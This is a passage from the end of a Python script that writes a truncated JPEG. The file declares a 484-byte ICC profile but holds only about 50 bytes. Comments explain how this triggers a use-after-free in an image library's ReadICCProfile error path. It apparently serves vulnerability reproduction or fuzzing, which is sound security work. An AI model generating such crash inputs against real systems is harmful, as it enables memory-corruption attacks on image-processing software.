L_ONLY_50_BYTES_HERE\'\n    f.write(partial_data)\n    \n    # File ends here abruptly - no SOF, no image data, no EOI\n    # This will cause:\n    # 1. ReadICCProfile to allocate profile buffer for 484 bytes\n    # 2. Read loop hits EOF after ~50 bytes\n    # 3. i != length check triggers, profile is freed (line 569)\n    # 4. But error_manager->profile is NOT cleared\n    # 5. Later setjmp recovery tries to free it again -> UAF\n\nprint(f"Generated malformed JPEG testcase at {output_path}")\nprint(f"File size: {open(output_path, \'rb\').read().__len__()} bytes")\n'}
